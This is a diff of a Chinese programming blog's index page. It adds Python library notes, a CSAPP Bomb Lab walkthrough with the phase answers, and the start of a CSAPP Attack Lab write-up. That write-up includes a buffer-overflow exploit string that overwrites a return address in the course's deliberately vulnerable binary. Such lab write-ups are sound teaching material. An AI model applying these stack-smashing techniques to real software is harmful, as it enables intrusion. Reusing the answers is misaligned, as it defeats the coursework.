@@ -154,13 +154,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">100</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -214,7 +214,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E8%AF%AD%E6%B3%95/C++/%E5%B8%B8%E9%87%8F%E6%8C%87%E9%92%88%E4%B8%8E%E6%8C%87%E9%92%88%E5%B8%B8%E9%87%8F/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/16/%E8%AF%AD%E6%B3%95/python/python%E5%BA%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -232,7 +232,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E8%AF%AD%E6%B3%95/C++/%E5%B8%B8%E9%87%8F%E6%8C%87%E9%92%88%E4%B8%8E%E6%8C%87%E9%92%88%E5%B8%B8%E9%87%8F/" class="post-title-link" itemprop="url">常量指针与指针常量</a>
+          <a href="/2023/06/16/%E8%AF%AD%E6%B3%95/python/python%E5%BA%93/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -243,23 +243,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-16 10:34:21" itemprop="dateCreated datePublished" datetime="2023-06-16T10:34:21+08:00">2023-06-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-02 21:14:14" itemprop="dateModified" datetime="2024-03-02T21:14:14+08:00">2024-03-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/grammar/" itemprop="url" rel="index"><span itemprop="name">语法</span></a>
-        </span>
+      <time title="修改时间：2023-11-16 22:46:24" itemprop="dateModified" datetime="2023-11-16T22:46:24+08:00">2023-11-16</time>
     </span>
 
   
@@ -272,9 +263,21 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (c)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;afa&quot;</span>);</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> *p2 = &amp;x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p2);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">//*p2 = 3; //常量指针，指向常量的指针，*p2是一个常量，不能修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p2);</span><br><span class="line">    <span class="type">int</span> *<span class="type">const</span> p3 = &amp;x;</span><br><span class="line">    <span class="comment">// p3 = &amp;y;  //指针常量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <p>python库</p>
+<h1 id="tqdm"><a href="#tqdm" class="headerlink" title="tqdm"></a>tqdm</h1><p><a href="https://tqdm.github.io/docs/tqdm/"><strong>init</strong></a></p>
+<h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>软件运行过程中跟踪一些事件发生</p>
+<p><a href="https://www.cnblogs.com/yoyoblogs/p/10948052.html">python学习笔记二:(python3 logging函数中format说明) - 陌生初见 - 博客园 (cnblogs.com)</a></p>
+<h1 id="argparser"><a href="#argparser" class="headerlink" title="argparser"></a>argparser</h1><p><a href="https://blog.csdn.net/yy_diego/article/details/82851661">argparse基本用法</a></p>
+<h1 id="PIL"><a href="#PIL" class="headerlink" title="PIL"></a>PIL</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图片，图片尺寸，通道数</span></span><br><span class="line">img=Image.<span class="built_in">open</span>(<span class="string">&quot;Image/1.jpg&quot;</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">img.size,img.layers</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/image-20210406115550244.png" alt="image-20210406115550244"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#图片变为numpy对象，W*H*C,范围[0-256]</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img_ndarray=np.asarray(img)</span><br><span class="line"><span class="comment">#W*H*C</span></span><br><span class="line">img_ndarray.shape</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#numpy转化为torch，C*W*H</span></span><br><span class="line">trans=torchvision.transforms.ToTensor()</span><br><span class="line">img2_trans=trans(img2_n)</span><br><span class="line">img2_trans.shape</span><br></pre></td></tr></table></figure>
+
+
+
 
       
     </div>
@@ -301,7 +304,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E8%AF%AD%E6%B3%95/python/Python%20Reference/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/16/Lab%20Project/CSAPP%20Bomb%20Lab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -319,7 +322,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E8%AF%AD%E6%B3%95/python/Python%20Reference/" class="post-title-link" itemprop="url">Python语法</a>
+          <a href="/2023/06/16/Lab%20Project/CSAPP%20Bomb%20Lab/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -330,23 +333,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-16 10:34:21" itemprop="dateCreated datePublished" datetime="2023-06-16T10:34:21+08:00">2023-06-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-02 21:14:35" itemprop="dateModified" datetime="2024-03-02T21:14:35+08:00">2024-03-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/grammar/" itemprop="url" rel="index"><span itemprop="name">语法</span></a>
-        </span>
+      <time title="修改时间：2023-11-22 20:30:51" itemprop="dateModified" datetime="2023-11-22T20:30:51+08:00">2023-11-22</time>
     </span>
 
   
@@ -359,31 +353,87 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>sequence</p>
-<h1 id="列表-lists"><a href="#列表-lists" class="headerlink" title="列表(lists)"></a>列表(lists)</h1><blockquote>
-<p>[1,2,3]</p>
-<p>odds&#x3D;[3,5,7,9,11]</p>
-<p>list(range(1,3))</p>
-<p>​     	[1,2]</p>
-<p>[odds[i] for i in range(1,3)]</p>
-<p>​	[5,7]</p>
-<p>sum([1,2,3])&#x3D;6</p>
-<p>sum([[1,2],[3]],[])&#x3D;[1,2,3]</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309112018499.png" alt="image-20230911201852400"></p>
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309112019380.png" alt="image-20230911201922327"></p>
-<ol>
-<li>函数参数加*号，代表将多个参数组装成列表</li>
-<li>数组前面加参数，代表把数组拆分成多个逗号分割的变量，类似js中的展开符号.</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">ls=[<span class="number">10</span>,<span class="number">12</span>]</span><br><span class="line">add(*ls)</span><br></pre></td></tr></table></figure>
+          <h1 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h1><p>查看bomb.c可以看到源代码的大致结构</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042020986.png" alt="image-20211204202050832"></p>
+<p>反汇编main函数：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
 
-<h2 id="range"><a href="#range" class="headerlink" title="range"></a>range</h2><p>tuple</p>
-<blockquote>
-<p>immutable sequences</p>
-</blockquote>
-<p>Lecture18</p>
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309131030411.png" alt="image-20230913103055254"></p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042024386.png" alt="image-20211204202454298"></p>
+<p>根据汇编代码和原函数的对应关系，可以猜测方框处为对应的printf函数，打印出相应位置的字符串。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042027447.png" alt="image-20211204202746414"></p>
+<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>phase_1首先调用read_line函数，调用函数时返回值保存至%rax寄存器中，之后调用phase_1(input)，在汇编调用中mov %rax, %rdi，%rdi寄存器用于函数调用时的参数传递，因此可以猜测%rdi中为输入的字符串的首地址。</p>
+<p>反汇编phase_1，目标是要拆除bomb，则%eax的值应该为0，否则会调用explode_bomb。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042036445.png" alt="image-20211204203646413"></p>
+<p>反汇编strings_not_equal和其中的string_length</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042049188.png" alt="image-20211204204919118"></p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042043079.png" alt="image-20211204204331046"></p>
+<p>0对应于ASCII码的空字符，空字符是字符串的结束符，因此string_length为判断以%rdi为首地址的字符串的字符串的长度，并用%rax寄存器返回。</p>
+<p>所以在strings_not_equal中，首先判断%rsi ，%rdi为首地址的字符串长度是否相同，长度相同的话逐字符比较是否相等，如果两个字符串相等，%rax&#x3D;0，并返回。%rdi为输入的字符串，则%rsi为要判断是否相等的字符串，找出其地址，在汇编代码phase_1中，为0x402400，gdb查看内容。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042053647.png" alt="image-20211204205320626"></p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042054731.png" alt="image-20211204205419707"></p>
+<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>查看phase_2的汇编代码</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042059377.png" alt="image-20211204205903327"></p>
+<p>查看调用的read_six_numbers函数汇编代码</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042132486.png" alt="image-20211204213232445"></p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042133975.png" alt="image-20211204213314955"></p>
+<p>可以发现函数读入6个int型数据，其中四个数据的存储位置通过寄存器传递，另外两个通过栈进行传递。</p>
+<p>传递函数参数的寄存器</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042131451.png" alt="image-20211204213138427"></p>
+<p>在read_six_numbers中（下图为16进制）：</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042132770.png" alt="image-20211204213209675"></p>
+<p>分析phase_2的汇编代码，先判断(%rsp)处的值是否为1，然后与自己相加，即乘以2后与下一个数比较，依次向下，直到数据末尾。因此要输入的字符串为</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">32</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042137075.png" alt="image-20211204213743046"></p>
+<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>查看phase_3的汇编代码</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051122677.png" alt="image-20211205112242562"></p>
+<p>在蓝色框中调用了scanf函数，并且返回值要大于1，否则炸弹会爆炸。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051125258.png" alt="image-20211205112527233"></p>
+<p>可以看到scanf接受两个int值。</p>
+<p>设置断点，随便输入两个数测试，发现0xc(%rsp)处为输入的第二个数，0x8(%rsp)处为输入的第一个数。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051134698.png" alt="image-20211205113446648"></p>
+<p>则phase_3的汇编代码读入两个数后，将输入的第一个数与7比较，小于则跳转到*0x402470(, x, 8)处，x为输入的第一个数。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051142973.png" alt="image-20211205114250947"></p>
+<p>输入的第一数为1时，跳转到0x400fb9，此处的指令将%eax寄存器的值设为0x137&#x3D;311，并与第二个数比较。不同则调用explode_bomb。</p>
+<p>因此输入为1 311，也可选择输入别的数。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051148670.png" alt="image-20211205114821636"></p>
+<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051300220.png" alt="image-20211205130044173"></p>
+<p>与phase_3一样，这里也要输入两个数，同时还可以看出第一个数小于等于14，第二个数为0。通过寄存器给func4传递了三个参数%edi（输入的第一个数），%esi（0），%edx（0xe&#x3D;14）</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051317090.png" alt="image-20211205131746044"></p>
+<p>这里递归调用了func4函数，将汇编代码转换成等价的C代码，用a表示%edi的值，b表示%esi的值，c表示%edx的值</p>
+<p>用标记t表示蓝色框最后%eax的值，则[（c-b）&gt;&gt;31+（c-b）] &gt;&gt; 1</p>
+<p>下面用tmp表示执行完0x400fdf后%ecx的值：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun4</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = (((c - b) + ((c - b) &gt;&gt; <span class="number">31</span>)) &gt;&gt; <span class="number">1</span>) + b;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt;= a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp &gt;= a)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">return</span> (<span class="built_in">fun4</span>(a, tmp + <span class="number">1</span>, c) * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">fun4</span>(a, b, tmp - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">fun4</span>(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到第一个数可能为：0，1，3，7</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051153046.png" alt="image-20211205115347016"></p>
+<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051540229.png" alt="image-20211205154040157"></p>
+<p>先从上往下看，第一个红色框设置金丝雀值，然后判断输入的字符串长度是否为6。忽略其中部分代码，蓝色框是可以使函数正常退出的流程，其中比较了0x10(%rsp)处开始的字符串与0x40245e处开始的字符串是否相等。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051547240.png" alt="image-20211205154748217"></p>
+<p>则函数栈中相应位置为：</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051602264.png" alt="image-20211205160209218"></p>
+<p>分析绿色框中的汇编代码，因为%rbx的值为%rdi，即我们输入的字符串首地址，进行一系列操作，实际到红色框时，%rdx的低位字节的低4位对应于对应的字符值，其余全部置0。重要的是这条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and    $0xf,%edx</span><br></pre></td></tr></table></figure>
+
+<p>这时是以输入的字符数值大小作为索引，来到0x40108b查找相应的字符，放到位置0x10(%rsp, %rax, 1)处。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051611546.png" alt="image-20211205161111520"></p>
+<p>这个实验的设置很有意思，哈哈，我们在这个数组中逐字符找到flyers的相应位置下标为：9 F E 5 6 7</p>
+<p>这时只要到ASCII码中查找X9, XF, XE, X5, X6, X7相应的可输入字符即可，比如第一个字符可以为 ) (29)    9(39)    I(49)等。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051154265.png" alt="image-20211205115408234"></p>
+<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>终于到了最后阶段。依旧对汇编代码进行分割，划分成几个阶段。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051821451.png" alt="image-20211205182158385"></p>
+<p>与phase_2一样，读入6个int型数据，放到%rsi为首地址的地方，下面包含两个循环，外循环依次遍历6个数，内循环将这个数与之后的数比较。</p>
+<p>外循环对原数据减1后$\leq$5，则原数据$\leq$6，同时这6个数据相互之间不想等。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051902625.png" alt="image-20211205190200537"></p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051937578.png" alt="image-20211205191611260"></p>
+<p>这里首先对输入的六个数据进行7-x处理后在放到原位置。下面反复出现0x6032d0这个值。查看内存内容，可以发现其结构类似于结构体链表：</p>
+<p>%rdx初始值为0x6032d0，则<code>mov 0x8(%rdx),%rdx</code>指令取下一个节点的地址。<code>	mov    (%rsp,%rsi,1),%ecx</code>取输入的数据值，如果不是1的话，则递增%eax，同时%rdx指向下一个节点的地址，指导%eax的值与当前的输入数据值相等。并将相应的节点位置放到</p>
+<p><code>mov    %rdx,0x20(%rsp,%rsi,2)</code>，因此输入的数据对应了内存位置中的第几个节点。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051919795.png" alt="image-20211205191926752"></p>
+<p>%rbx&#x3D;0x20(%rsp)，这段代码保证了%rbx后面相应地址指针所指向的地址内容的低4位字节是递减顺序，这里就很坑，因为高四位字节就是1，2，3，4，5，6，看起来很顺眼。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112052007599.png" alt="image-20211205200728497"></p>
+<p>得到上图，相应的数据为3 4 5 6 1 2，则原输入数据为：4 3 2 1 6 5</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051154882.png" alt="image-20211205115430850"></p>
 
       
     </div>
@@ -410,7 +460,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E8%AF%AD%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/16/Lab%20Project/CSAPP%20Attack%20Lab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -428,7 +478,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">C语法</a>
+          <a href="/2023/06/16/Lab%20Project/CSAPP%20Attack%20Lab/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -439,23 +489,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-16 10:34:21" itemprop="dateCreated datePublished" datetime="2023-06-16T10:34:21+08:00">2023-06-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-13 21:34:56" itemprop="dateModified" datetime="2023-11-13T21:34:56+08:00">2023-11-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/grammar/" itemprop="url" rel="index"><span itemprop="name">语法</span></a>
-        </span>
+      <time title="修改时间：2024-03-01 16:42:27" itemprop="dateModified" datetime="2024-03-01T16:42:27+08:00">2024-03-01</time>
     </span>
 
   
@@ -468,29 +509,141 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="lt-stdio-h-gt"><a href="#lt-stdio-h-gt" class="headerlink" title="&lt;stdio.h&gt;"></a>&lt;stdio.h&gt;</h1><ul>
-<li><p>scanf</p>
-<blockquote>
-<p>读取空格、换行符</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;c);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;****\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;^^^^\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %c\n&quot;</span>, a, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204191133356.png" alt="image-20210406120658645"></p>
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204191133436.png" alt="image-20210406120721087"></p>
-</li>
-<li></li>
+          <h1 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h1><p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab - 简书 (jianshu.com)</a></p>
+<h2 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。</p>
+<ul>
+<li>test</li>
 </ul>
-<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h2><blockquote>
-<p>int a[10];	声明，未初始化</p>
-<p>int a[10]&#x3D;{0};  &#x2F;&#x2F;全部初始化为0</p>
-<p>int a[10]&#x3D;{1};	&#x2F;&#x2F;第一个元素为1，后面初始化为0</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261040430.png" alt="image-20211126104027322"></p>
+<ul>
+<li>getbuf</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261041743.png" alt="image-20211126104154718"></p>
+<ul>
+<li>touch1</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:		movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>查看touch1的地址，用touch1的地址覆盖原来的返回地址</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>将每个字节的十六进制表示通过hex2raw转换为字符串，并将得到的字符串作为ctarget的输入。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271848491.png" alt="image-20211127184819454"></p>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>插入一段代码作为攻击字符串（exploit string）的一部分。</p>
+<p>设置断点，查看栈顶地址。</p>
